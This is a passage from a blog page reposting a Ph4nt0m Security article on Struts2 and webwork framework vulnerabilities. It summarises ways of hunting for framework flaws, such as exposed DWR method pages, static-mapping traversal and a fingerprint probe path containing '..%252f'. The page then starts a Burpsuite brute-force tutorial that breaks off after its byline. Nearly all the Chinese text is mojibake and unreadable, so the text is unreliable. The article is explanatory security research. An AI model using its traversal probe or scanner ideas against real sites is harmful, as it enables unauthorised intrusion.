href="http://www.inbreak.net/app/struts/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/struts/hibernate.cfg.xml</a> <img src="" alt=""></p>
<h3 id="-">æ€»ç»“</h3>
<p>ä½œè€…æŒ–äº†struts2çš„ä¸€äº›æ¼æ´ï¼Œä¹ŸæŒ–äº†ä¸€äº›webå…¶ä»–æ¡†æ¶çš„æ¼æ´ï¼ˆä¸åœ¨æœ¬æ–‡èŒƒå›´ï¼‰ï¼Œæ€»ç»“ä¸‹æŒ–å–è¿™äº›æ¡†æ¶æ¼æ´ çš„æ–¹å¼ã€‚ é¦–å…ˆï¼Œæ˜¯ä¸Šä¸ä¸Šæ¡†æ¶çš„é—®é¢˜ã€‚ä¸€æ—¦å¼€å‘ç”¨äº†è¿™äº›æ¡†æ¶ï¼Œwebåº”ç”¨ä¼šç›´æ¥é¢ä¸´ä¸€äº›æ¼æ´ï¼š</p>
<h3 id="1-">1ï¼Œå¼€æ”¾äº†æŸåŠŸèƒ½ï¼Œå¯¼è‡´é‡‡ç”¨æ¡†æ¶çš„åº”ç”¨é»˜è®¤æ¼æ´</h3>
<p>å› ä¸ºè¿™ä¸ªæ¡†æ¶åœ¨æœªç»å…è®¸çš„æƒ…å†µä¸‹ï¼Œæ‚„æ‚„çš„æ‰“å¼€äº†æŸäº›åŠŸèƒ½ï¼Œå¯èƒ½æ˜¯ä¸ºäº†æ–¹ä¾¿å¼€å‘ç­‰ä½œç”¨ï¼Œç»“æœå¯¼è‡´äº†æ¼æ´ çš„äº§ç”Ÿã€‚ ä¸¾ä¸ªä¾‹ï¼š æ¯”å¦‚DWRè¿™ä¸ªAJAXæ¡†æ¶ä¸€æ—¦ä½¿ç”¨ï¼Œåœ¨æŸäº›ç‰ˆæœ¬é‡Œï¼Œè¾“å…¥ <a href="http://www.inbreak.net/app/dwr/" target="_blank">http://www.inbreak.net/app/dwr/</a> å°±èƒ½çœ‹åˆ°ä¸€ä¸ªé¡µé¢ï¼Œé‡Œé¢æ˜¯æ‰€æœ‰ajaxæ–¹æ³•çš„æ˜ å°„ï¼Œç”šè‡³ä¸€äº›serviceæ–¹æ³•æ²¡æœ‰é…ç½®ï¼Œè‡ªåŠ¨æ˜ å°„äº†å‡ºæ¥ã€‚ ä½ å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢ç»™é‚£äº›æ˜ å°„å‡ºæ¥çš„æ–¹æ³•æäº¤å‚æ•°ï¼Œè°ƒç”¨æ–¹æ³•ã€‚æ¯”å¦‚æœ‰ä¸ªgetUserpasswdByidçš„æ–¹æ³•ï¼Œçœ‹åç§° å°±çŸ¥é“ï¼Œä¼ é€’ç”¨æˆ·idï¼Œè¿”å›å¯†ç ã€‚ <img src="" alt=""> å†ä¸¾ä¾‹å°±æ˜¯æœ¬æ–‡ä¸­çš„struts2çš„../../æ¼æ´ã€‚ å¦‚æœè¦æŒ–è¿™ç§æ¼æ´ï¼Œç»å¯¹æ˜¯0dayçº§åˆ«çš„æ¼æ´ï¼Œæ‰€ä»¥å¤§å®¶æœ‰å¿…è¦æ€€ç–‘æ¯ä¸€ä¸ªå®ç°æ­¥éª¤ï¼Œè¿™ç§æ¼æ´å…¶å®å¤§éƒ¨åˆ†å°± å‡ºç°åœ¨å¼€å‘ç¯å¢ƒå’Œæ­£å¼ç¯å¢ƒçš„å·®å¼‚ï¼Œä»¥åŠä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„åŠŸèƒ½ç‚¹ä¸Šã€‚</p>
<h3 id="2-">2ï¼Œæ‰©å±•äº†æŸåŠŸèƒ½ï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜</h3>
<p>æˆ‘ä»¬çš„webåº”ç”¨ï¼Œæœ¬æ¥æ˜¯å¯ä»¥è‡ªå·±å†™ä»£ç å®ç°ä¸€äº›åŠŸèƒ½çš„ï¼Œä½†æ˜¯è¿™ä¸ªæ¡†æ¶ä¸ºäº†æ–¹ä¾¿å¼€å‘å’Œç®¡ç†ï¼ŒæŠŠå¼€å‘äººå‘˜ è¦å†™çš„ä»£ç åŒ…è£…äº†ä¸‹ï¼Œåªè¦ç®€å•çš„å‡ è¡Œå°±èƒ½å®ç°åŸæœ¬å¤§æ‰¹ä»£ç æ‰èƒ½åšåˆ°çš„åŠŸèƒ½ã€‚è€Œè¿™äº›ä¾¿åˆ©ï¼Œå´å¸¦æ¥äº†å¾ˆå¤š å®‰å…¨é—®é¢˜ã€‚æŒ–æ¼æ´çš„åŒæ—¶ï¼Œåº”è¯¥ç‰¹åˆ«æ³¨æ„å“ªäº›åœ°æ–¹æ¯”åŸæ¥æ–¹ä¾¿äº†å¾ˆå¤šï¼Œæ‰©å±•äº†å¾ˆå¤šï¼Œè¿™äº›æ‰©å±•å’Œæ–¹ä¾¿ï¼Œæ˜¯å¦ è€ƒè™‘åˆ°äº†å®‰å…¨å› ç´ ã€‚ æ¯”å¦‚æœ¬æ–‡ä»‹ç»çš„strutsçš„resultï¼ˆurlredirectï¼‰ç›¸å…³æ¼æ´ã€‚</p>
<h3 id="3-demo-">3ï¼ŒDEMOæˆ–æ•™ç¨‹æˆ–ç”¨æˆ·æŒ‡å—è¯¯å¯¼</h3>
<p>è‡ªä»æ¡†æ¶å‡ºç°åï¼Œä¸ºäº†è®©äººä»¬æœ€å¿«çš„äº†è§£å’Œä½¿ç”¨æ¡†æ¶ï¼Œå®˜æ–¹å‡ºäº†å¾ˆå¯¹ç”¨æˆ·æ‰‹å†Œï¼Œdemoç­‰åŠŸèƒ½ã€‚è€Œå¾ˆå¤šå¤§ç‰›ä»¬ï¼Œ ä¹Ÿç›¸åº”çš„å‡ºäº†æ•™ç¨‹æˆ–è€…ä¹¦ç±ï¼Œä½†æ˜¯è¿™äº›æ•™ç¨‹ï¼ŒDEMOï¼Œä¹¦ç±ä¸Šçš„ä¾‹å­ï¼Œæ°æ°äº§ç”Ÿäº†å¾ˆå¤šæ¼æ´ã€‚ç”šè‡³å¼€å‘æœ¬æ¥ ä¸æŒ‰ç…§æ•™ç¨‹èµ°ï¼Œä¸ä¼šæœ‰æ¼æ´ï¼Œå´è¢«æ•™ç¨‹è¯¯å¯¼äº†ã€‚å¦‚æœé»‘å®¢çœ‹åˆ°è¿™äº›ä¹¦ç±ï¼Œè¯·ç«‹åˆ»æŠŠä»–åˆ—åˆ°ä½ çš„æ‰«æå™¨ä¸­ï¼Œ ç»å¯¹æœ‰ä¸å°‘å¼€å‘ä¼šæŒ‰ç…§æ•™ç¨‹ä¸Šå»åšã€‚ ä¾‹å¦‚æœ¬æ–‡æåˆ°çš„é‚£ä¸ªä¹¦ç±ä»‹ç»æˆ‘ä»¬ä½¿ç”¨ajaxçš„äº‹æƒ…ã€‚</p>
<h3 id="4-">4ï¼ŒåŸæœ¬æœ‰å®‰å…¨æ–¹æ¡ˆï¼Œä½†æ˜¯è¢«æŸåŠŸèƒ½ä»£ç è¦†ç›–</h3>
<p>è¿™å…¶å®æ˜¯ä¸€ä»¶æ‚²å‰§çš„äº‹æƒ…ï¼Œå‘Šè¯‰æˆ‘ä»¬è¦æ³¨æ„åœ¨æ—¥å¸¸å¼€å‘ä¸­å’Œæ¼æ´ä¿®è¡¥ä¸­ï¼Œæ˜¯å¦æœ‰ä¸æ˜çœŸç›¸çš„å¼€å‘äººå‘˜ï¼Œ ä¸ºäº†å®ç°æŸä¸ªåŠŸèƒ½ï¼Œæ‚„æ‚„çš„æŠŠåŸæœ¬çš„å®‰å…¨æ–¹æ¡ˆæ–­ç« å–ä¹‰çš„è¦†ç›–æ‰äº†ã€‚æŒ–æ¼æ´çš„æ—¶å€™ï¼Œè¦ç‰¹åˆ«æ³¨æ„å®‰å…¨æ–¹æ¡ˆé™„ä»¶ çš„ä»£ç å˜åŠ¨ï¼Œå¾ˆå¯èƒ½å‘ç°éå¸¸å¼±æ™ºçš„é€»è¾‘é—®é¢˜ã€‚ ä¾‹å¦‚æœ¬æ–‡æäº¤çš„classæ–‡ä»¶çš„åˆ¤æ–­ã€‚</p>
<h3 id="5-">5ï¼Œä¸å®Œå–„çš„å®‰å…¨</h3>
<p>ä¸€ä¸ªå®‰å…¨æ–¹æ¡ˆçš„å®æ–½ï¼Œåº”è¯¥æ˜¯å½»å¤´å½»å°¾çš„ï¼Œè¦æ³¨æ„æ–¹æ¡ˆçš„å®Œæ•´æ€§ï¼Œä¸èƒ½æœ‰äº›åœ°æ–¹æ–¹æ¡ˆOKï¼Œæœ‰äº›åœ°æ–¹ä¸èƒ½å®æ–½ã€‚ åœ¨æŒ–æ¼æ´çš„æ—¶å€™ï¼Œä¹Ÿä¸è¦è¢«å®‰å…¨æ–¹æ¡ˆå“ä½ï¼Œå¹¶ä¸æ˜¯æœ‰äº†æ–¹æ¡ˆï¼Œå¬èµ·æ¥ç‰›Xï¼Œå°±ç»å¯¹ä¸ä¼šæœ‰æ¼æ´çš„ï¼Œæœ€èµ·ç åº”è¯¥ ç»è¿‡å…¨é¢fuzzã€‚ ä¾‹å¦‚æœ¬æ–‡æåˆ°çš„XSSé—æ¼ç‚¹ï¼Œä»¥åŠå¯Œæ–‡æœ¬çš„é—æ¼ã€‚</p>
<h3 id="6-">6ï¼Œç‰ˆæœ¬å‡çº§åï¼Œæ²¡æœ‰é†’ç›®å®‰å…¨å…¬å‘Š</h3>
<p>æˆ‘ä»¬çŸ¥é“æ‰€æœ‰çš„æ¶æ„å¸ˆéƒ½ä¸æ„¿æ„æœ‰äº‹æ²¡äº‹å‡çº§æ¡†æ¶ï¼Œç‰¹åˆ«æ˜¯ä¸ç¨³å®šçš„æ¡†æ¶ç‰ˆæœ¬ï¼Œå› ä¸ºè¿™ä¸ªå‡çº§å¯èƒ½å¸¦æ¥å¾ˆå¤š ä¸å¯é¢„æ–™çš„é—®é¢˜ï¼Œæ‰€ä»¥å¯èƒ½å³ä½¿çœ‹åˆ°äº†å®‰å…¨å…¬å‘Šï¼Œä¹Ÿæ²¡æœ‰å»å‡çº§ã€‚å¦‚æœä¸æ‡‚å®‰å…¨ï¼Œæ›´ä¸æ„¿æ„å‡çº§æ¡†æ¶äº†ã€‚ æ‰€ä»¥å®˜æ–¹å¿…é¡»åšåˆ°ä¸€ä¸ªæ¼æ´çš„ä¿®è¡¥ï¼Œä¸€ä¸ªå…¬å‘Šçš„å‘å¸ƒï¼Œå¿…é¡»å¸¦æœ‰ç›¸å…³çš„ä»£ç logã€‚å‘Šè¯‰å¤§å®¶å…·ä½“å“ªé‡Œåšäº†æ”¹åŠ¨ã€‚ è€ŒæŒ–æ¼æ´çš„åŒå­¦æ›´åº”è¯¥ç›¯ç´§è¿™äº›åœ°æ–¹ï¼Œç™¾èˆ¬æ¨æ•²å’Œæµ‹è¯•ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œä¸è¦è¢«ä¸€æ¬¡å…¬ç”¨çš„æµ‹è¯•ç»“æœå“åˆ°ï¼Œæ¨¡ç³Šçš„ è®¤ä¸ºæ¼æ´å·²ç»ä¿®è¡¥äº†ã€‚</p>
<h3 id="7-">7ï¼Œæ‚²å‰§çš„æ–¹æ¡ˆ</h3>
<p>å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å®˜æ–¹ä¿®è¡¥æ¼æ´ï¼Œæˆ–è€…ä¸€äº›å®‰å…¨æ–¹æ¡ˆçš„å®æ–½ç»“æœã€‚é‚£æ˜¯ä¸æ˜¯çœŸçš„éƒ½èƒ½è¾¾åˆ°ä¿®è¡¥æ¼æ´çš„ æ•ˆæœå‘¢ï¼Ÿ ä¾‹å¦‚æœ¬æ–‡çš„<s:url>æ ‡ç­¾çš„xssæ¼æ´ï¼Œå®˜æ–¹éƒ½è¿™ä¸ªæ¼æ´çš„ä¿®è¡¥ï¼ŒçœŸæ˜¯ç»å°½è„‘æ±ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‚²å‰§äº†ã€‚</p>
<h3 id="8-">8ï¼Œä¼˜ç§€çš„æ–¹æ¡ˆï¼Œæ‚²å‰§çš„æ‰§è¡Œ</h3>
<p>RTï¼Œä¸å†è¯´æ˜ã€‚</p>
<h3 id="9-web-">9ï¼ŒæŒ‘æˆ˜webæœåŠ¡å™¨é…ç½®</h3>
<p>è¿™ä¸ªé—®é¢˜æœ‰å¿…è¦è¯´ä¸€è¯´ï¼Œstrutsæœ‰äº‹æ²¡äº‹åšä¸ªé™æ€æ˜ å°„åšä»€ä¹ˆï¼Ÿå…¶å®æ˜¯ç›®çš„å°±æ˜¯ä¸ºäº†æ¡†æ¶å’Œåº”ç”¨åˆ†ç¦»ï¼Œå¾ˆ æ˜æ˜¾é‚£äº›jsæ–‡ä»¶åº”è¯¥æ”¾åœ¨é¡¹ç›®ä¸­çš„webç›®å½•ä¸‹ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦åšå‘¢ï¼Ÿè¿˜ä¸æ˜¯å› ä¸ºstrutsåŒ…å‘å¸ƒçš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰ é¡¹ç›®ï¼Œåªæœ‰æ¡†æ¶ã€‚ å®ƒä¸ºäº†è¾¾åˆ°å³ä½¿ä¸Šäº†ä»»ä½•é¡¹ç›®ï¼Œä¹Ÿèƒ½æœ‰åŠæ³•è®¿é—®åˆ°å®ƒæä¾›çš„é‚£äº›jsçš„ç›®çš„ï¼Œåªå¥½è¢«é€¼æ— å¥ˆåšäº†è¿™ä¸ªåŠŸèƒ½ï¼Œé™æ€ ç›®å½•æ˜ å°„ã€‚æ— è®ºä»»ä½•é¡¹ç›®ï¼Œéƒ¨ç½²åï¼Œåªè¦urlåé¢æ ¹ç›®å½•åŠ ä¸Š/strutsï¼Œæˆ–è€…/staticå°±å¯ä»¥è®¿é—®jsã€‚åæ¥åšäº† è¿™ä¸ªåŠŸèƒ½æ„Ÿè§‰è‰¯å¥½è¿˜ä¸ç®—ï¼Œå±…ç„¶æŠŠåŠŸèƒ½æä¾›å‡ºæ¥ï¼Œç»™æ¨èç»™å¼€å‘äººå‘˜ä½¿ç”¨ã€‚å½’æ ¹ç»“åº•æ˜¯å› ä¸ºstrutsæŒ‘æˆ˜äº† webæœåŠ¡å™¨çš„é…ç½®ï¼Œéè¦è‡ªå·±åšé™æ€æ˜ å°„ã€‚è¦çŸ¥é“äººå®¶webæœåŠ¡å™¨åšçš„æ˜ å°„ï¼Œæ˜¯ç»è¿‡å¤šå°‘å¹´é»‘å®¢å…¥ä¾µæ‰“ç£¨å‡ºæ¥çš„ï¼Œ strutsæœ‰å—ï¼Ÿ è¿™ç§æƒ…å†µçªå‡ºåœ¨å•ç‹¬æ˜ å°„æŸç›®å½•ï¼Œå•ç‹¬å¯¹æŸç›®å½•åšæƒé™ï¼ŒåšDIRåˆ—è¡¨ç­‰åŠŸèƒ½ï¼Œå¦‚æœä½ çœ‹åˆ°ä¸€ä¸ªæ¡†æ¶ä¹Ÿåšäº†è¿™ç§ åŠŸèƒ½ï¼Œæ­å–œä½ ï¼èµ¶å¿«å»æŒ–ï¼Œåæœ‰å…«ä¹å­˜åœ¨æ¼æ´ï¼</p>
<h3 id="10-">10ï¼Œæ²¡æœ‰å®‰å…¨æ–¹æ¡ˆï¼Œä¹Ÿæ²¡æœ‰æé†’</h3>
<p>æœ¬æ–‡å…¶å®æ²¡æœ‰æåˆ°ä¸€äº›webæ¼æ´ï¼Œæ¯”å¦‚csrfï¼Œæ¯”å¦‚session fixï¼Œæ¯”å¦‚ä¼ è¾“åŠ å¯†ç­‰ï¼Œå¾ˆæ˜æ˜¾strutsæ˜¯å­˜åœ¨æ¼æ´ çš„ï¼Œåªæ˜¯ä½œè€…è§‰å¾—è¿™äº›ä¸œè¥¿æ²¡å¿…è¦è¿™é‡Œè¯´ï¼Œå¤§å®¶éƒ½æ˜¯æ˜çœ¼äººï¼Œçœ‹åˆ°formé‡Œæ²¡æœ‰tokenï¼Œç™¾åˆ†ç™¾csrfå˜›ï¼ æƒ³æƒ³å®˜æ–¹ï¼Œå®˜æ–¹ä¹Ÿæ˜æ˜çŸ¥é“ä¸Šäº†è‡ªå·±çš„æ¡†æ¶åï¼Œä¼šå­˜åœ¨è¿™äº›æ¼æ´ï¼Œä¸ºä»€ä¹ˆè¿ä¸ªæé†’éƒ½æ²¡æœ‰å‘¢ï¼Ÿæœ¬æ¥å¼€å‘å°± ä¸çŸ¥é“ï¼Œä½ åˆè—ç€æ–ç€ã€‚å¦‚æœæ¡†æ¶è´Ÿè´£ä»»ï¼Œå‘ä¸ªå…¬å‘Šï¼Œè¯´å¦‚æœä½ ç”¨äº†æˆ‘çš„æ¡†æ¶ï¼Œå®é™…ä¸Šè¦å°å¿ƒä»€ä¹ˆä»€ä¹ˆæ”»å‡»ã€‚ã€‚ã€‚ å‘ƒã€‚ã€‚ã€‚æˆ‘æ˜ç™½å®˜æ–¹ä¸ºä»€ä¹ˆä¸æ•¢è¯´äº†ã€‚-_-! è¿™äº›æ¡†æ¶é™¤äº†é‚£äº›â€œåªè¦ä½ ç”¨ï¼Œå¿…ç„¶æœ‰æ¼æ´â€çš„å®‰å…¨ç¼ºé™·å¤–ï¼Œè¿˜æœ‰ä¸å°‘é—®é¢˜ï¼Œä¼šå‡ºç°åœ¨å¼€å‘äººå‘˜ä½¿ç”¨æ¡†æ¶çš„ è¿‡ç¨‹ä¸­ï¼š 1ï¼Œä¸¤ä¸ªæ¡†æ¶éƒ½æ–¹ä¾¿ï¼Œç»“åˆèµ·æ¥æœ‰æ¼æ´ æœ‰ä¸ªæ¡†æ¶å«åšSpring securityï¼Œæ˜¯åŸºäºurlçš„è®¿é—®æƒé™æ§åˆ¶ï¼Œåšçš„å¾ˆå¥½ã€‚å¦‚æœä½ ä¸æ˜¯ç®¡ç†å‘˜ï¼Œç»å¯¹ä¸èƒ½ è®¿é—®adminç›®å½•ã€‚ä½†æ˜¯æœ‰å¾ˆå¤šwebæ¡†æ¶ï¼Œè®¿é—®ä¸€ä¸ªactionæˆ–è€…è®¿é—®ä¸€ä¸ªcontrollerï¼Œä¸æ­¢ä¸€ä¸ªurlå¯ä»¥è®¿é—®ï¼Œ åœ¨è¿™é‡Œåšäº†å…¼å®¹æ€§å¤„ç†ï¼Œå¤šä¸ªurlæŒ‡å‘åŒä¸€ä¸ªåº”ç”¨ï¼Œå¯¼è‡´Spring securityè¿™ç§åŸºäºurlçš„è®¿é—®æ§åˆ¶ï¼Œåå­˜å®äº¡ã€‚ 2ï¼Œå¼€å‘äººå‘˜â€œæ­£å¸¸â€ä½¿ç”¨æ¡†æ¶åï¼Œå¯èƒ½äº§ç”Ÿæ¼æ´ è¿™æ˜¯æœ€æœ€æƒ¨çš„äº‹æƒ…ï¼Œæ¡†æ¶ç»å¯¹ä¸ä¼šè®¤é¢†è¿™ç§ç±»å‹çš„æ¼æ´çš„ï¼Œä»–ä¼šè®¤ä¸ºè¿™æ˜¯å¼€å‘çš„é—®é¢˜ã€‚ç„¶è€Œæœ¬æ–‡çš„ â€œactionæ–¹æ³•æš´åŠ›ç ´è§£ã€url redirectæ‰©å¤§åŒ–â€è¿™ä¸¤ä¸ªå®‰å…¨ç¼ºé™·ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯æ¡†æ¶å­˜åœ¨çš„æ„ä¹‰ï¼ˆæ–¹ä¾¿å¼€å‘ï¼‰ å¸¦æ¥çš„åæœã€‚å®˜æ–¹ä¼šä¿®è¡¥ä¹ˆï¼Ÿæˆ‘æƒ³å®ƒé¡¶å¤šä¼šè¯´ï¼Œå¤§å®¶ä¸è¦è¿™æ ·é‚£æ ·è€Œå·²ï¼Œç»å¯¹ä¸ä¼šåšä»€ä¹ˆå®‰å…¨æ–¹æ¡ˆçš„ã€‚ è¦çŸ¥é“è¿™äº›æ¼æ´æ˜¯å…·æœ‰strutsæˆ–è€…webworkç‰¹è‰²çš„ï¼Œåªæœ‰ä½¿ç”¨äº†è¿™äº›æ¡†æ¶æ‰ä¼šæœ‰çš„ã€‚ 3ï¼Œå±é™©åŠŸèƒ½ç‚¹ æ¡†æ¶å¸¦æ¥äº†ä¸€äº›åŠŸèƒ½ç‚¹ï¼Œæ¯”å¦‚Tag libçš„ä¸€äº›XSSï¼Œåªè¦ä½¿ç”¨ï¼Œå¿…å®šæœ‰æ¼æ´ã€‚ 4ï¼Œæ¡†æ¶ç»™å¼€å‘æŒ–å‘ è¿™æ ¹æœ¬å°±æ˜¯é™·é˜±ï¼Œè¿˜æ˜¯è¦è¯´/staticã€/strutsï¼Œå¦‚æœå¼€å‘ä¸é…ç½®ï¼Œé¡¶å¤šä¸‹è½½ä¸ªjsï¼Œå½±å“ä¸å¤§ï¼Œä¸‡ä¸€å¼€å‘ä½¿ç”¨ äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæ˜ å°„äº†æŸä¸ªç›®å½•ï¼Œé‚£å°±æ‰è¿›å‘é‡Œå»äº†ã€‚ 5ï¼Œä¸€ä¸ªæ¡†æ¶å¸¦æ¥çš„æ¼æ´è¢«å¦ä¸€ä¸ªæ¡†æ¶æœ€å¤§åŒ– æœ¬æ–‡æåˆ°äº†å˜é‡é»˜è®¤å€¼è¢«è¦†ç›–åï¼Œåˆå› ä¸ºhibernateä¸éœ€è¦å†™sqlè¯­å¥ï¼Œè€Œæœ€ç»ˆè¢«å­˜å‚¨è¿›äº†æ•°æ®åº“ä¸­ã€‚ å›æƒ³ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè®©æˆ‘ä»¬è‡ªå·±å†™sqlè¯­å¥å®ç°ï¼Œéš¾é“åœ¨æ·»åŠ æ™®é€šç”¨æˆ·çš„æ—¶å€™ï¼Œä¼šçœŸçš„ä¸“é—¨å†™ä¸ªå˜é‡ï¼Œ æ¥æ”¶ç”¨æˆ·ä¼ è¿›æ¥æ³¨å†Œç®¡ç†å‘˜çš„å­—æ®µä¹ˆï¼Ÿ ä½†æ˜¯è¿™æ˜¯hibernateå¾—é—®é¢˜ä¹ˆï¼Ÿå½“ç„¶ä¸æ˜¯ï¼Œåªæ˜¯å› ä¸ºæœ‰äº†å®ƒï¼Œå¯¼è‡´æ¼æ´æ›´åŠ ä¸¥é‡è€Œå·²ã€‚</p>
<h3 id="-">è¡¥å……</h3>
<p>æœ¬æ–‡å¯¹struts2çš„ç§ç§å®‰å…¨ç¼ºé™·ï¼Œå°±æåˆ°è¿™é‡Œã€‚ä¸ªäººè§‰å¾—è¿™æ˜¯ä¸€ä¸ªæŒ–æ¼æ´çš„æ–¹å‘ï¼Œå¯¹frameworkæ¼æ´çš„æŒ–æ˜ã€‚ å¯èƒ½å¤§å®¶éƒ½ä¸“æ³¨äºä»£ç å®‰å…¨ï¼Œæ²¡æœ‰å¤ªå¤šçš„å»çœ‹æ¡†æ¶æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œä»¥åŠä½¿ç”¨äº†æ¡†æ¶åï¼Œæ˜¯å¦çœŸçš„å®‰å…¨ã€‚ æ‰€ä»¥å¾ˆå¤šäººå¿½ç•¥è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ç›¸ä¿¡è¿™ä¸æ˜¯ä¸€ä¸ªæ–°çš„å¼€å§‹ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªç»“æŸï¼Œåªæ˜¯è®©å¤§å®¶å¼€å§‹æ›´åŠ é‡è§†æ¡†æ¶å®‰å…¨ã€‚ ä½œè€…ä¹Ÿä»…ä»…åœ¨æœ¬æ–‡æåˆ°äº†strutsï¼Œwebworkè¿™ä¸¤ä¸ªæ¡†æ¶ï¼Œäº‹å®ä¸Šæ¡†æ¶å¾ˆå¤šï¼Œä»–ä»¬çœŸçš„å®‰å…¨ä¹ˆï¼Ÿæœ‰å¾…è€ƒè¯ï¼ æœ€åå†™ç»™é‚£äº›çœŸæ­£æ‰“ç®—æŠŠæŠ€æœ¯åº”ç”¨äºå®è·µçš„åŒå­¦ä»¬ï¼Œæ¡†æ¶æ¼æ´æ‰«æå™¨ï¼Œæ˜¯å¯ä»¥åšå‡ºæ¥çš„ï¼Œå¯¹äºéš¾ä»¥è§£å†³çš„çŒœè§£ é—®é¢˜ï¼Œå¯ä»¥å¯¹ç½‘ç«™èœ˜è››ä¸€ä¸‹ï¼Œç„¶åä¿å­˜é‚£äº›å¼€å‘äººå‘˜å–œæ¬¢ä½¿ç”¨çš„å­—æ®µåç§°ï¼Œå…³æ³¨å„ä¸ªinputçš„åå­—ï¼Œactionçš„ åå­—ï¼Œç›®å½•åå­—ç­‰ï¼Œç”ŸæˆçŒœè§£ä¸€ä¸ªåˆ—è¡¨ã€‚è€Œåˆ¤æ–­æ˜¯å¦ç”¨äº†strutsæ›´åŠ ç®€å•ï¼š ç‰¹å¾1ï¼šXXX.action å¯èƒ½æ˜¯strutsæˆ–webwork ç‰¹å¾2ï¼šXXX.do å¯èƒ½æ˜¯strutsæˆ–webwork ç‰¹å¾3ï¼šXXX!bbb.action å¯èƒ½æ˜¯strutsæˆ–webwork ç‰¹å¾4ï¼šXXX/struts/..%252f å¿…ç„¶æ˜¯struts2 å…¶ä»–ç»†èŠ‚å¤„ï¼Œä¸å†ä¸€ä¸€ç»™å‡ºï¼Œæœ‰å¾…å¤§å®¶å‘æ˜ã€‚ ç›¸å…³çš„æ¼æ´ä¿®è¡¥æ–¹å¼ï¼Œä½œè€…ä¸åœ¨æ­¤å¤„çŒ®ä¸‘ï¼Œè¯·å¤§å®¶æ ¹æ®æ¼æ´åŸç†è‡ªè¡Œå¤„ç†ã€‚</p>
<h3 id="-">æ„Ÿè°¢</h3>
<p>---------------------------------------- æ„Ÿè°¢axis ï¼ˆ<a href="http://hi.baidu.com/aullik5ï¼‰å¯¹æœ¬æ–‡æå‡ºçš„å»ºè®®ã€‚" target="_blank">http://hi.baidu.com/aullik5ï¼‰å¯¹æœ¬æ–‡æå‡ºçš„å»ºè®®ã€‚</a> æ„Ÿè°¢å¹»å½±webzine <a href="http://webzine.ph4nt0m.org/" target="_blank">http://webzine.ph4nt0m.org/</a> æ„Ÿè°¢strutsæ‰€æœ‰å¼€å‘äººå‘˜ç§ç§æœ‰è¶£çš„ä»£ç ã€‚ ä½œè€…DEMOä¸­æœ‰æ•æ„Ÿæ•°æ®ï¼Œæ•ä¸èƒ½æä¾›ï¼Œè¯·å¤§å®¶è‡ªè¡Œæœç´¢strutsdemoæ­å»ºç¯å¢ƒæµ‹è¯•ã€‚ Struts2ï¼š<a href="http://struts.apache.org/2.x/" target="_blank">http://struts.apache.org/2.x/</a> Struts2 svnï¼š<a href="http://svn.apache.org/viewvc/struts/struts2/trunk/" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/</a>
Powered by: <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security</a> Â© 2009 <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security Team</a>.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-29 14:34:04"datetime="2014-03-29 14:34:04"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-Java--Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T09:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h1>
<h3 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h3>
<p><a href="http://www.freebuf.com/articles/web/7457.html#" target="_blank"></a><a href="http://www.freebuf.com/author/gall" title="ç”± Gall å‘å¸ƒ">Gall</a> @ <a href="http://www.freebuf.com/category/articles/web" title="æŸ¥çœ‹ WEBå®‰å…¨ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">WEBå®‰å…¨</a> 2013-02-28</p>
<p>æ„Ÿè°¢<a href="http://www.freebuf.com/author/gall" target="_blank">Gall</a>æŠ•é€’</p>
